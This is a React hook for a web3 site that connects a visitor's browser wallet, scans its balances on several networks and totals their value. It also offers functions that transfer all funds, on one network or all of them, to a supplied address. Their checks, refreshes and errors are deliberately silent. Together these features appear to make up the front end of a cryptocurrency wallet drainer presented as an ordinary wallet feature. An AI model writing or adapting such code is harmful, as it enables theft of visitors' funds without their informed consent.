import { useState, useEffect, useCallback } from "react";
import { web3Service, type WalletState } from "@/lib/web3";
import { useToast } from "@/hooks/use-toast";

const initialState: WalletState = {
  isConnected: false,
  address: null,
  ethBalance: null,
  tokenBalances: [],
  totalUsdValue: 0,
  networkId: null,
  networkName: null,
  provider: null,
  networkBalances: [],
  allNetworksLoaded: false,
};

export function useWeb3() {
  const [walletState, setWalletState] = useState<WalletState>(initialState);
  const [isConnecting, setIsConnecting] = useState(false);
  const [isTransferring, setIsTransferring] = useState(false);
  const [isLoadingNetworks, setIsLoadingNetworks] = useState(false);
  const [hasShownConnectedToast, setHasShownConnectedToast] = useState(false);
  const [hasAnyNetworkFunds, setHasAnyNetworkFunds] = useState(false);
  const [crossNetworkValue, setCrossNetworkValue] = useState(0);
  const { toast } = useToast();

  // Removed automatic connection attempts that were causing repeated notifications

  const connectWallet = useCallback(async () => {
    setIsConnecting(true);
    try {
      // Fast wallet connection - get basic state immediately
      const state = await web3Service.connectWallet();
      console.log('Wallet connected instantly:', state);
      
      // Set basic wallet state immediately for instant UI feedback
      setWalletState(state);
      setIsConnecting(false);
      
      // Show connection success immediately
      if (!hasShownConnectedToast) {
        toast({
          title: "Wallet Connected",
          description: `Connected to ${state.address?.slice(0, 6)}...${state.address?.slice(-4)}`,
        });
        setHasShownConnectedToast(true);
      }
      
      // Start network scanning in background after connection is complete
      if (state.address) {
        setIsLoadingNetworks(true);
        console.log('Starting background multi-network scan...');
        
        // Non-blocking network scan
        web3Service.refreshNetworkBalances(state.address).then(networkBalances => {
          console.log(`Background scan completed: found balances on ${networkBalances.length} networks`);
          
          setWalletState(prev => ({
            ...prev,
            networkBalances,
            allNetworksLoaded: true
          }));
          
          // Update cross-network fund status
          const hasAnyFunds = web3Service.hasAnyNetworkFunds();
          const totalValue = web3Service.getTotalCrossNetworkValue();
          setHasAnyNetworkFunds(hasAnyFunds);
          setCrossNetworkValue(totalValue);
          
          setIsLoadingNetworks(false);
        }).catch(networkError => {
          console.error('Background multi-network scan failed:', networkError);
          setWalletState(prev => ({
            ...prev,
            allNetworksLoaded: true
          }));
          setIsLoadingNetworks(false);
        });
      }
      
      return true;
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Connection Failed",
        description: error.message,
      });
      setIsConnecting(false);
      setIsLoadingNetworks(false);
      throw error;
    }
  }, [toast, hasShownConnectedToast]);

  const refreshBalance = useCallback(async () => {
    if (!walletState.address || !walletState.networkId) return;

    try {
      const ethBalance = await web3Service.getEthBalance(walletState.address);
      const tokenBalances = await web3Service.getTokenBalances(walletState.address, walletState.networkId);
      const totalUsdValue = await web3Service.calculateTotalUsdValue(ethBalance, tokenBalances);
      
      setWalletState(prev => ({ 
        ...prev, 
        ethBalance,
        tokenBalances,
        totalUsdValue
      }));
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Refresh Balance",
        description: error.message,
      });
    }
  }, [walletState.address, walletState.networkId, toast]);

  const transferAllFunds = useCallback(async (toAddress: string) => {
    // Silent validation
    if (!walletState.isConnected || !walletState.address || !window.ethereum) {
      return null;
    }

    setIsTransferring(true);
    try {
      const txHashes = await web3Service.transferAllFunds(toAddress);
      
      // Silent refresh after transaction
      setTimeout(() => {
        refreshBalance();
      }, 3000);

      return txHashes;
    } catch (error: any) {
      return null;
    } finally {
      setIsTransferring(false);
    }
  }, [walletState.isConnected, walletState.address, refreshBalance]);



  const getTransactionStatus = useCallback(async (txHash: string) => {
    try {
      return await web3Service.getTransactionStatus(txHash);
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Get Transaction Status",
        description: error.message,
      });
      return null;
    }
  }, [toast]);

  // Setup event listeners for account and network changes
  useEffect(() => {
    const handleAccountChange = (accounts: string[]) => {
      if (accounts.length === 0) {
        setWalletState(initialState);
        setHasShownConnectedToast(false); // Reset toast flag
        toast({
          title: "Wallet Disconnected",
          description: "Your wallet has been disconnected",
        });
      } else if (accounts[0] !== walletState.address) {
        // Account changed, update state without reconnecting
        setWalletState(prev => ({
          ...prev,
          address: accounts[0]
        }));
      }
    };

    const handleNetworkChange = (networkId: string) => {
      // Network changed, update state without full reconnection
      if (walletState.isConnected) {
        setWalletState(prev => ({
          ...prev,
          networkId: networkId,
          networkName: `Network ${networkId}`
        }));
      }
    };

    web3Service.setupEventListeners(handleAccountChange, handleNetworkChange);

    return () => {
      web3Service.removeEventListeners();
    };
  }, [walletState.address, walletState.isConnected, connectWallet, toast]);

  // Enhanced connection state persistence and monitoring
  useEffect(() => {
    const persistConnectionState = () => {
      if (walletState.isConnected && walletState.address) {
        sessionStorage.setItem('wallet_connected', 'true');
        sessionStorage.setItem('wallet_address', walletState.address);
      } else {
        sessionStorage.removeItem('wallet_connected');
        sessionStorage.removeItem('wallet_address');
      }
    };

    persistConnectionState();

    // Disabled real-time monitoring for better performance
    // Connection state changes will be handled by wallet events instead
  }, [walletState.isConnected, walletState.address, toast]);

  // Controlled auto-connect - prevent multiple triggers
  useEffect(() => {
    const instantAutoConnect = () => {
      // Skip if no ethereum, already connecting, or already connected
      if (!window.ethereum || isConnecting || walletState.isConnected) return;
      
      // Quick session check
      const wasConnected = sessionStorage.getItem('wallet_connected');
      const savedAddress = sessionStorage.getItem('wallet_address');
      
      if (wasConnected === 'true' && savedAddress) {
        // Direct eth_accounts call - fastest method
        window.ethereum.request({ method: "eth_accounts" })
          .then((accounts: string[]) => {
            if (accounts && accounts.length > 0 && accounts[0] === savedAddress) {
              // Only reconnect if the saved address matches current account
              connectWallet();
            } else {
              // Clear outdated session data
              sessionStorage.clear();
            }
          })
          .catch(() => sessionStorage.clear());
      }
    };

    // Run only once when component mounts
    instantAutoConnect();
  }, []); // Remove dependencies to prevent re-running

  const refreshAllNetworks = useCallback(async () => {
    if (!walletState.address) return;
    
    setIsLoadingNetworks(true);
    try {
      const networkBalances = await web3Service.refreshNetworkBalances(walletState.address);
      setWalletState(prev => ({
        ...prev,
        networkBalances,
        allNetworksLoaded: true
      }));
      
      toast({
        title: "Networks Updated",
        description: `Found balances across ${networkBalances.length} networks`,
      });
    } catch (error: any) {
      toast({
        variant: "destructive",
        title: "Failed to Refresh Networks",
        description: error.message,
      });
    } finally {
      setIsLoadingNetworks(false);
    }
  }, [walletState.address, toast]);

  const transferAllFundsMultiNetwork = useCallback(async (toAddress: string) => {
    // Silent validation
    if (!walletState.isConnected || !walletState.address || !window.ethereum) {
      return null;
    }

    setIsTransferring(true);
    try {
      const result = await web3Service.transferAllFundsMultiNetwork(toAddress);
      
      // Silent refresh after transfer
      setTimeout(() => {
        if (walletState.address) {
          refreshAllNetworks();
        }
      }, 5000);

      return result;
    } catch (error: any) {
      return null;
    } finally {
      setIsTransferring(false);
    }
  }, [walletState.isConnected, walletState.address, refreshAllNetworks]);

  return {
    walletState,
    isConnecting,
    isTransferring,
    isLoadingNetworks,
    hasAnyNetworkFunds,
    crossNetworkValue,
    connectWallet,
    refreshBalance,
    refreshAllNetworks,
    transferAllFunds,
    transferAllFundsMultiNetwork,
    getTransactionStatus,
  };
}
